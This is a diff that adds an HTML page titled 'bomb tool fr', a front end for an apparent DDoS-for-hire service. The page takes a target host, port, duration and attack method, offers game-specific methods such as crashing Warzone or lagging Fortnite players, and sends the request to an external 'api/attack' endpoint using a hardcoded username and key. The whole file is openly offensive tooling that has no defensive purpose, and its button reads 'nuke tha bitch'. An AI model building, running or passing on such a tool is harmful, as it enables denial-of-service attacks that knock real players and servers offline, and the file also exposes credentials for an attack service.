@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>bomb tool fr</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212; /* Dark background */
+            color: #f5f5f5; /* Light text color */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            height: 100vh; /* Full height */
+        }
+        .method-list {
+            width: 50%; /* Take up 50% of the screen */
+            padding: 20px;
+            color: #f5f5f5;
+            border-right: 1px solid #444;
+            display: flex;
+            flex-direction: column;
+            background-color: #1e1e1e; /* Same background as input area */
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3); /* Subtle shadow for depth */
+        }
+        .method-list h2 {
+            text-align: center;
+            color: #fff;
+            margin-bottom: 20px;
+        }
+        .method-list ul {
+            list-style: none;
+            padding: 0;
+            overflow-y: auto;
+            height: calc(100vh - 80px); /* Adjust height for scrolling */
+        }
+        .method-list ul li {
+            margin: 10px 0;
+            cursor: pointer;
+            color: #cccccc;
+            padding: 10px;
+            border: 1px solid #444;
+            border-radius: 4px;
+            transition: background-color 0.3s ease;
+        }
+        .method-list ul li:hover {
+            color: #fff;
+            background-color: #333;
+        }
+        .container {
+            width: 50%; /* Take up 50% of the screen */
+            max-width: 600px;
+            margin: 20px;
+            padding: 20px;
+            border: 1px solid #444;
+            border-radius: 8px;
+            background-color: #1e1e1e;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3); /* Subtle shadow for depth */
+        }
+        h1 {
+            text-align: center;
+            color: #ffffff;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            color: #cccccc;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 4px;
+            border: 1px solid #444;
+            background-color: #333;
+            color: #fff;
+        }
+        input:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0056b3;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #004494;
+        }
+        #iframe-container {
+            margin-top: 20px;
+            height: 400px;
+            border: 1px solid #444;
+            border-radius: 4px;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Left side method list -->
+    <div class="container">
+        <h2>Method List</h2>
+        <ul>
+            <li onclick="fillMethod('GAME-DAYZ')">GAME-DAYZ (DayZ)</li>
+            <li onclick="fillMethod('GAME-AMONGUS')">GAME-AMONGUS (Amongus)</li>
+            <li onclick="fillMethod('GAME-FALLGUYS')">GAME-FALLGUYS (FallGuys)</li>
+            <li onclick="fillMethod('GAME-GZW')">GAME-GZW (Green Zone Warfare)</li>
+            <li onclick="fillMethod('GAME-OVERWATCH')">GAME-OVERWATCH (Overwatch)</li>
+            <li onclick="fillMethod('GAME-PUBG')">GAME-PUBG (Pubg | PC & Mobile)</li>
+            <li onclick="fillMethod('GAME-ROBLOX')">GAME-ROBLOX (Non-Udmux Roblox)</li>
+            <li onclick="fillMethod('GAME-APEX')">GAME-APEX (Apex Legends)</li>
+            <li onclick="fillMethod('GAME-RECROOM')">GAME-RECROOM (Rec Room)</li>
+            <li onclick="fillMethod('GAME-DBD')">GAME-DBD (Dead By Daylight)</li>
+            <li onclick="fillMethod('GAME-ROCKETLEAGUE')">GAME-ROCKETLEAGUE (Rocket League)</li>
+            <li onclick="fillMethod('GAME-FORTNITE')">GAME-FORTNITE (Fortnite)</li>
+            <li onclick="fillMethod('GAME-R6')">GAME-R6 (Rainbow six siege)</li>
+            <li onclick="fillMethod('GAME-XDEFIANT')">GAME-XDEFIANT (xDefiant)</li>
+            <li onclick="fillMethod('GAME-WARZONE-LAG')">GAME-WARZONE-LAG (Call of Duty Warzone)</li>
+            <li onclick="fillMethod('GAME-WARZONE-CRASH')">GAME-WARZONE-CRASH (Call of Duty Warzone)</li>
+            <li onclick="fillMethod('GAME-BO6')">GAME-BO6 (Call of Duty: Black Ops 6)</li>
+        </ul>
+    </div>
+
+    <!-- Main container for form -->
+    <div class="container">
+        <h1>bomb tool fr</h1>
+
+        <!-- User input form -->
+        <label for="host">host</label>
+        <input type="text" id="host" placeholder="enter target" required>
+
+        <label for="port">port</label>
+        <input type="text" id="port" placeholder="enter port" required>
+
+        <label for="time">time</label>
+        <input type="text" id="time" placeholder="enter time" required>
+
+        <label for="method">method</label>
+        <input type="text" id="method" placeholder="enter method" required>
+
+        <button onclick="loadIframe()">nuke tha bitch</button>
+
+        <!-- Iframe to display API response -->
+        <div id="iframe-container">
+            <iframe id="responseIframe"></iframe>
+        </div>
+    </div>
+
+    <script>
+        // Hardcoded username and password
+        const username = "xrajyrlgoh";
+        const password = "kqlxuujpzrwddez";
+
+        // Function to send API request and load in iframe
+        function loadIframe() {
+            const host = document.getElementById("host").value;
+            const port = document.getElementById("port").value;
+            const time = document.getElementById("time").value;
+            const method = document.getElementById("method").value;
+
+            if (!host || !port || !time || !method) {
+                alert("Please fill in all fields.");
+                return;
+            }
+
+            // Construct the API URL
+            const apiUrl = `https://_.space-api.net/api/attack?username=${username}&key=${password}&host=${host}&port=${port}&time=${time}&method=${method}`;
+
+            // Load the API URL directly in the iframe
+            document.getElementById("responseIframe").src = apiUrl;
+        }
+
+        // Function to autofill the method input field when a method is clicked
+        function fillMethod(methodName) {
+            document.getElementById("method").value = methodName;
+        }
+    </script>
+</body>
+</html>
